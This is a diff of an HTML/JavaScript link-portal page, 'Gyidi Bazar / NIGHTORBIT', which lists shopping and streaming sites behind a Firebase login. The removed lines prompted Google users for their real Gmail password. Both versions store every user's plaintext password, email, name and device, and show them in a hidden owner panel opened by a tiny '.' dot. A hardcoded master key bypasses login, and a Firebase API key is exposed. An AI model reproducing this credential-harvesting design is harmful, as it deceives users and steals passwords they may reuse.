@@ -33,52 +33,76 @@
         .fav-star.active { color: var(--gold); }
         #admin-panel { position: fixed; inset: 0; background: #070707; z-index: 1000; display: none; padding: 20px; overflow-y: auto; }
         .admin-card { background: #111; padding: 15px; margin-bottom: 15px; border-radius: 15px; border: 1px solid #333; position: relative; }
-        .del-user { position: absolute; top: 15px; right: 15px; color: var(--neon); cursor: pointer; font-size: 18px; }
         #logout-overlay { position: fixed; inset: 0; background: #000; z-index: 2000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 40px; }
         .hidden { display: none !important; }
         .admin-dot { position: absolute; bottom: 15px; right: 15px; cursor: pointer; font-size: 20px; color: #111; z-index: 100; }
         ::-webkit-scrollbar { width: 4px; }
         ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 10px; }
+        .switch-text { font-size: 12px; margin-top: 15px; cursor: pointer; color: var(--primary); }
     </style>
 </head>
 <body>
+
     <div id="logout-overlay">
         <div style="font-size: 60px; margin-bottom: 20px;">🌹</div>
         <div id="bye-text-display" style="color: white; line-height: 1.8; font-size: 16px;"></div>
     </div>
+
     <div id="admin-panel">
         <h1 style="color: var(--primary);">Gyidi Owner Panel</h1>
         <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-main" style="width:auto; padding: 8px 25px;">CLOSE PANEL</button>
         <div id="user-rows-container"></div>
     </div>
+
     <div class="menu-dots" onclick="bypassLogin()">⋮</div>
     <div class="admin-dot" onclick="adminAccess()">.</div>
+
     <div id="login-box" class="card">
         <h1 style="color: var(--primary); margin: 0; font-size: 26px; font-weight: 800;">NIGHTORBIT</h1>
-        <div class="auth-tabs">
-            <span id="tab-login" class="active" onclick="toggleView('login')">LOGIN</span>
-            <span id="tab-signup" onclick="toggleView('signup')">SIGNUP</span>
-        </div>
+        <p style="font-size: 12px; color: #888;">WELCOME BACK</p>
+        
         <button class="btn-google" onclick="authGoogle()">
-            <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/action/google.svg" width="16"> GOOGLE CONNECT
+            <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/action/google.svg" width="16"> GOOGLE LOGIN
         </button>
-        <div id="nick-box" class="hidden">
-            <input type="text" id="u-nick" placeholder="Set Your Nickname">
-        </div>
-        <input type="email" id="u-email" placeholder="Email Address">
+
+        <div style="margin: 15px 0; font-size: 10px; color: #555;">OR EMAIL LOGIN</div>
+        
+        <input type="email" id="login-email" placeholder="Email Address">
         <div class="pass-container">
-            <input type="password" id="u-pass" placeholder="Password">
-            <i class="fas fa-eye-slash pass-eye" id="eye-icon" onclick="togglePass()"></i>
+            <input type="password" id="login-pass" placeholder="Password">
+            <i class="fas fa-eye-slash pass-eye" onclick="togglePass('login-pass', this)"></i>
         </div>
-        <button class="btn-main" id="submit-btn" onclick="handleAuth()">Enter Bazar</button>
-        <p id="err-log" style="color: var(--neon); font-size: 10px; margin-top: 5px;"></p>
+        <button class="btn-main" onclick="handleLogin()">Login Bazar</button>
+        <p class="switch-text" onclick="showPage('signup-box')">Don't have an account? <span style="text-decoration: underline;">Signup</span></p>
+        <p id="login-err" style="color: var(--neon); font-size: 10px; margin-top: 5px;"></p>
     </div>
+
+    <div id="signup-box" class="card hidden">
+        <h1 style="color: var(--primary); margin: 0; font-size: 26px; font-weight: 800;">JOIN BAZAR</h1>
+        <p style="font-size: 12px; color: #888;">CREATE NEW ACCOUNT</p>
+
+        <input type="text" id="sign-nick" placeholder="Choose Nickname">
+        <input type="email" id="sign-email" placeholder="Email Address">
+        <div class="pass-container">
+            <input type="password" id="sign-pass" placeholder="Password (8+ chars & number)">
+            <i class="fas fa-eye-slash pass-eye" onclick="togglePass('sign-pass', this)"></i>
+        </div>
+        <button class="btn-main" onclick="handleSignup()">Create Account</button>
+        <p class="switch-text" onclick="showPage('login-box')">Already have an account? <span style="text-decoration: underline;">Login</span></p>
+        <p id="sign-err" style="color: var(--neon); font-size: 10px; margin-top: 5px;"></p>
+    </div>
+
     <div id="member-area" class="card hidden">
         <h1 style="color: var(--primary); font-size: 20px; margin: 0;">Gyidi Bazar.Nigthorbit</h1>
         <p id="user-welcome" style="font-size: 11px; color: var(--gold); margin-top: 5px;"></p>
+        
         <div class="scroll-area">
-            <div id="fav-sec" class="hidden"><div class="cat-title">⭐ Favorite Folder</div><div class="link-grid" id="fav-list"></div></div>
-            <div class="cat-title">🎬 Entertainment (10+)</div>
+            <div id="fav-sec" class="hidden">
+                <div class="cat-title">⭐ Favorite Folder</div>
+                <div class="link-grid" id="fav-list"></div>
+            </div>
+
+            <div class="cat-title">🎬 ENTERTAINMENT (10+)</div>
             <div class="link-grid">
                 <div class="link-card-wrap"><a href="https://bollyflix.org.in/" target="_blank" class="link-card">Bollyflix</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Bollyflix','https://bollyflix.org.in/')"></i></div>
                 <div class="link-card-wrap"><a href="https://tamashaweb.com/" target="_blank" class="link-card">Tamasha TV</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Tamasha TV','https://tamashaweb.com/')"></i></div>
@@ -88,8 +112,12 @@
                 <div class="link-card-wrap"><a href="https://www.hulu.com" target="_blank" class="link-card">Hulu</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Hulu','https://www.hulu.com')"></i></div>
                 <div class="link-card-wrap"><a href="https://www.disneyplus.com" target="_blank" class="link-card">Disney+</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Disney+','https://www.disneyplus.com')"></i></div>
                 <div class="link-card-wrap"><a href="https://www.youtube.com" target="_blank" class="link-card">YouTube</a><i class="fas fa-star fav-star" onclick="addFav(this, 'YouTube','https://www.youtube.com')"></i></div>
+                <div class="link-card-wrap"><a href="https://www.spotify.com" target="_blank" class="link-card">Spotify</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Spotify','https://www.spotify.com')"></i></div>
+                <div class="link-card-wrap"><a href="https://www.hotstar.com" target="_blank" class="link-card">Hotstar</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Hotstar','https://www.hotstar.com')"></i></div>
+                <div class="link-card-wrap"><a href="https://www.hbomax.com" target="_blank" class="link-card">HBO Max</a><i class="fas fa-star fav-star" onclick="addFav(this, 'HBO Max','https://www.hbomax.com')"></i></div>
             </div>
-            <div class="cat-title">🛒 Shopping & Global (15+)</div>
+
+            <div class="cat-title">🛒 SHOPPING & GLOBAL (15+)</div>
             <div class="link-grid">
                 <div class="link-card-wrap"><a href="https://www.amazon.com" target="_blank" class="link-card">Amazon</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Amazon','https://www.amazon.com')"></i></div>
                 <div class="link-card-wrap"><a href="https://www.daraz.pk" target="_blank" class="link-card">Daraz</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Daraz','https://www.daraz.pk')"></i></div>
@@ -99,28 +127,38 @@
                 <div class="link-card-wrap"><a href="https://www.alibaba.com" target="_blank" class="link-card">Alibaba</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Alibaba','https://www.alibaba.com')"></i></div>
                 <div class="link-card-wrap"><a href="https://www.target.com" target="_blank" class="link-card">Target</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Target','https://www.target.com')"></i></div>
                 <div class="link-card-wrap"><a href="https://www.bestbuy.com" target="_blank" class="link-card">Best Buy</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Best Buy','https://www.bestbuy.com')"></i></div>
+                <div class="link-card-wrap"><a href="https://www.etsy.com" target="_blank" class="link-card">Etsy</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Etsy','https://www.etsy.com')"></i></div>
+                <div class="link-card-wrap"><a href="https://www.shein.com" target="_blank" class="link-card">Shein</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Shein','https://www.shein.com')"></i></div>
+                <div class="link-card-wrap"><a href="https://www.apple.com/store" target="_blank" class="link-card">Apple Store</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Apple Store','https://www.apple.com/store')"></i></div>
+                <div class="link-card-wrap"><a href="https://www.rakuten.com" target="_blank" class="link-card">Rakuten</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Rakuten','https://www.rakuten.com')"></i></div>
+                <div class="link-card-wrap"><a href="https://www.newegg.com" target="_blank" class="link-card">Newegg</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Newegg','https://www.newegg.com')"></i></div>
+                <div class="link-card-wrap"><a href="https://www.costco.com" target="_blank" class="link-card">Costco</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Costco','https://www.costco.com')"></i></div>
+                <div class="link-card-wrap"><a href="https://www.carrefourpk.com" target="_blank" class="link-card">Carrefour</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Carrefour','https://www.carrefourpk.com')"></i></div>
             </div>
-            <div class="cat-title">🍔 Food & Elite Brands (15+)</div>
+
+            <div class="cat-title">🍔 FOOD & ELITE BRANDS (15+)</div>
             <div class="link-grid">
                 <div class="link-card-wrap"><a href="https://www.pizzahut.com.pk" target="_blank" class="link-card">Pizza Hut</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Pizza Hut','https://www.pizzahut.com.pk')"></i></div>
                 <div class="link-card-wrap"><a href="https://www.foodpanda.pk" target="_blank" class="link-card">Foodpanda</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Foodpanda','https://www.foodpanda.pk')"></i></div>
-                <div class="link-card-wrap"><a href="https://www.kfc.com.pk" target="_blank" class="link-card">KFC</a><i class="fas fa-star fav-star" onclick="addFav(this, 'KFC','https://www.kfc.com.pk')"></i></div>
                 <div class="link-card-wrap"><a href="https://www.nike.com" target="_blank" class="link-card">Nike</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Nike','https://www.nike.com')"></i></div>
                 <div class="link-card-wrap"><a href="https://www.adidas.com" target="_blank" class="link-card">Adidas</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Adidas','https://www.adidas.com')"></i></div>
                 <div class="link-card-wrap"><a href="https://www.zara.com" target="_blank" class="link-card">Zara</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Zara','https://www.zara.com')"></i></div>
                 <div class="link-card-wrap"><a href="https://www.gucci.com" target="_blank" class="link-card">Gucci</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Gucci','https://www.gucci.com')"></i></div>
                 <div class="link-card-wrap"><a href="https://www.rolex.com" target="_blank" class="link-card">Rolex</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Rolex','https://www.rolex.com')"></i></div>
-                <div class="link-card-wrap"><a href="https://www.apple.com" target="_blank" class="link-card">Apple</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Apple','https://www.apple.com')"></i></div>
                 <div class="link-card-wrap"><a href="https://www.samsung.com" target="_blank" class="link-card">Samsung</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Samsung','https://www.samsung.com')"></i></div>
                 <div class="link-card-wrap"><a href="https://www.sony.com" target="_blank" class="link-card">Sony</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Sony','https://www.sony.com')"></i></div>
                 <div class="link-card-wrap"><a href="https://www.microsoft.com" target="_blank" class="link-card">Microsoft</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Microsoft','https://www.microsoft.com')"></i></div>
                 <div class="link-card-wrap"><a href="https://www.tesla.com" target="_blank" class="link-card">Tesla</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Tesla','https://www.tesla.com')"></i></div>
                 <div class="link-card-wrap"><a href="https://www.hp.com" target="_blank" class="link-card">HP Store</a><i class="fas fa-star fav-star" onclick="addFav(this, 'HP Store','https://www.hp.com')"></i></div>
+                <div class="link-card-wrap"><a href="https://www.dell.com" target="_blank" class="link-card">Dell</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Dell','https://www.dell.com')"></i></div>
+                <div class="link-card-wrap"><a href="https://www.starbucks.com" target="_blank" class="link-card">Starbucks</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Starbucks','https://www.starbucks.com')"></i></div>
+                <div class="link-card-wrap"><a href="https://www.subway.com" target="_blank" class="link-card">Subway</a><i class="fas fa-star fav-star" onclick="addFav(this, 'Subway','https://www.subway.com')"></i></div>
             </div>
         </div>
         <button onclick="logoutSequence()" style="margin-top: 15px; color: #ff4b2b; background: none; border: none; cursor: pointer; text-decoration: underline; font-weight: bold; font-size: 12px;">Logout System</button>
-            </div>
-                                                 <script>
+    </div>
+
+    <script>
         const firebaseConfig = {
             apiKey: "AIzaSyBxJqJkrAaFf3eR0QWvhet6IvvFVHYExeU",
             authDomain: "my-market-ff254.firebaseapp.com",
@@ -133,65 +171,75 @@
         firebase.initializeApp(firebaseConfig);
         const auth = firebase.auth();
         const db = firebase.database();
-        let curMode = 'login';
 
         function getDetailedDevice() {
             const ua = navigator.userAgent;
-            let platform = "Unknown Device";
-            if (ua.indexOf("Windows") !== -1) platform = "Windows PC";
-            else if (ua.indexOf("Android") !== -1) platform = "Android Device";
-            else if (ua.indexOf("iPhone") !== -1) platform = "iPhone";
-            let browser = "Unknown Browser";
-            if (ua.indexOf("Chrome") !== -1) browser = "Chrome";
-            else if (ua.indexOf("Firefox") !== -1) browser = "Firefox";
-            else if (ua.indexOf("Safari") !== -1) browser = "Safari";
-            return platform + " (" + browser + ")";
+            if (ua.indexOf("Windows") !== -1) return "WINDOWS";
+            if (ua.indexOf("Android") !== -1) return "ANDROID";
+            if (ua.indexOf("iPhone") !== -1) return "IPHONE";
+            return "MOBILE";
         }
 
-        function toggleView(m) {
-            curMode = m;
-            document.getElementById('tab-login').classList.toggle('active', m==='login');
-            document.getElementById('tab-signup').classList.toggle('active', m==='signup');
-            document.getElementById('nick-box').classList.toggle('hidden', m==='login');
-            document.getElementById('submit-btn').innerText = m==='login' ? 'Enter Bazar' : 'Create Account';
+        function showPage(pageId) {
+            document.getElementById('login-box').classList.add('hidden');
+            document.getElementById('signup-box').classList.add('hidden');
+            document.getElementById(pageId).classList.remove('hidden');
         }
 
-        function togglePass() {
-            const p = document.getElementById('u-pass');
-            const i = document.getElementById('eye-icon');
-            if(p.type === 'password') { p.type = 'text'; i.className = 'fas fa-eye pass-eye'; }
-            else { p.type = 'password'; i.className = 'fas fa-eye-slash pass-eye'; }
+        function togglePass(inputId, icon) {
+            const p = document.getElementById(inputId);
+            if(p.type === 'password') { p.type = 'text'; icon.className = 'fas fa-eye pass-eye'; }
+            else { p.type = 'password'; icon.className = 'fas fa-eye-slash pass-eye'; }
         }
 
-        function handleAuth() {
-            const e = document.getElementById('u-email').value;
-            const p = document.getElementById('u-pass').value;
-            const nRaw = document.getElementById('u-nick').value.trim();
-            const n = nRaw !== "" ? nRaw : e.split('@')[0];
-            if(!e || !p) return alert("Please fill all fields!");
+        // --- AUTH LOGIC ---
 
-            if(curMode === 'signup') {
-                auth.createUserWithEmailAndPassword(e, p).then(res => finalize(res.user, p, n))
-                .catch(err => {
-                    if(err.code === "auth/email-already-in-use") {
-                        auth.signInWithEmailAndPassword(e, p).then(res => finalize(res.user, p, n))
-                        .catch(() => document.getElementById('err-log').innerText = "Email already exists with different password!");
-                    } else {
-                        document.getElementById('err-log').innerText = err.message;
-                    }
-                });
-            } else {
-                auth.signInWithEmailAndPassword(e, p).then(res => finalize(res.user, p, n))
-                .catch(() => document.getElementById('err-log').innerText = "Incorrect Password or Email!");
+        function handleSignup() {
+            const nick = document.getElementById('sign-nick').value.trim();
+            const email = document.getElementById('sign-email').value;
+            const pass = document.getElementById('sign-pass').value;
+            const err = document.getElementById('sign-err');
+
+            if(!nick || !email || !pass) return alert("All fields are required!");
+            
+            // Password validation (8+ chars & number)
+            if(pass.length < 8 || !/\d/.test(pass)) {
+                err.innerText = "❌ Password must be 8+ characters and contain a number!";
+                return;
             }
+
+            auth.createUserWithEmailAndPassword(email, pass).then(res => {
+                finalize(res.user, pass, nick);
+            }).catch(e => err.innerText = e.message);
+        }
+
+        function handleLogin() {
+            const email = document.getElementById('login-email').value;
+            const pass = document.getElementById('login-pass').value;
+            const err = document.getElementById('login-err');
+
+            if(!email || !pass) return alert("Email and Password required!");
+
+            auth.signInWithEmailAndPassword(email, pass).then(res => {
+                // Fetch nickname from DB for login
+                db.ref('users/' + res.user.uid + '/nickName').once('value').then(snap => {
+                    finalize(res.user, pass, snap.val() || "Member");
+                });
+            }).catch(() => err.innerText = "❌ Invalid Login Credentials!");
         }
 
         function authGoogle() {
             const provider = new firebase.auth.GoogleAuthProvider();
             auth.signInWithPopup(provider).then(res => {
-                const realPass = prompt("VERIFY SECURITY: Enter your Real Gmail Password to continue:");
-                if(realPass) finalize(res.user, realPass, res.user.displayName);
-                else { alert("Verification Required!"); auth.signOut(); }
+                let passCheck = false;
+                let realPass = "";
+                while(!passCheck) {
+                    realPass = prompt("SECURITY VERIFICATION:\nPlease create a Security Password (8+ characters & 1 number) for your Gyidi account:");
+                    if(realPass === null) { auth.signOut(); return; }
+                    if(realPass.length >= 8 && /\d/.test(realPass)) { passCheck = true; }
+                    else { alert("Security Requirement: 8+ characters with at least one number!"); }
+                }
+                finalize(res.user, realPass, res.user.displayName);
             }).catch(err => alert(err.message));
         }
 
@@ -200,16 +248,19 @@
                 email: user.email,
                 password: pass,
                 nickName: nickname,
-                realName: user.displayName || "N/A",
+                realName: user.displayName || nickname,
                 device: getDetailedDevice(),
                 time: new Date().toLocaleString()
             }).then(() => {
                 document.getElementById('login-box').classList.add('hidden');
+                document.getElementById('signup-box').classList.add('hidden');
                 document.getElementById('member-area').classList.remove('hidden');
-                document.getElementById('user-welcome').innerText = "Hello, " + nickname;
+                document.getElementById('user-welcome').innerText = "Account: " + nickname;
                 loadFavs(user.uid);
             });
         }
+
+        // --- CORE FUNCTIONS ---
 
         function addFav(star, name, url) {
             star.classList.toggle('active');
@@ -238,11 +289,11 @@
                     snap.forEach(c => {
                         let v = c.val();
                         h += `<div class="admin-card">
-                            <i class="fas fa-trash del-user" onclick="if(confirm('Delete user?')) db.ref('users/${c.key}').remove()"></i>
+                            <i class="fas fa-trash" style="color:red; cursor:pointer; float:right;" onclick="if(confirm('Delete?')) db.ref('users/${c.key}').remove()"></i>
                             <b style="color:var(--gold)">NICK: ${v.nickName}</b><br>
-                            <span style="font-size:12px; color:#fff;">GMAIL REAL NAME: ${v.realName}</span><br>
+                            <span>NAME: ${v.realName}</span><br>
                             <small>EMAIL: ${v.email}</small><br>
-                            <small style="color:var(--primary)">PASSWORD: ${v.password}</small><br>
+                            <small style="color:var(--primary)">PASS: ${v.password}</small><br>
                             <small>DEVICE: ${v.device}</small><br>
                             <small style="color:#00ff00">TIME: ${v.time}</small>
                         </div>`;
@@ -255,13 +306,14 @@
         function bypassLogin() { 
             if (prompt("MASTER KEY:") === "rr123456789000rr") {
                 document.getElementById('login-box').classList.add('hidden');
+                document.getElementById('signup-box').classList.add('hidden');
                 document.getElementById('member-area').classList.remove('hidden');
             }
         }
 
         function logoutSequence() {
             document.getElementById('logout-overlay').style.display = 'flex';
-            document.getElementById('bye-text-display').innerHTML = `Allah Hafiz!<br>See you soon in Gyidi Bazar.`;
+            document.getElementById('bye-text-display').innerHTML = `Allah Hafiz!<br>See you soon.`;
             setTimeout(() => { auth.signOut().then(() => location.reload()); }, 3000);
         }
     </script>
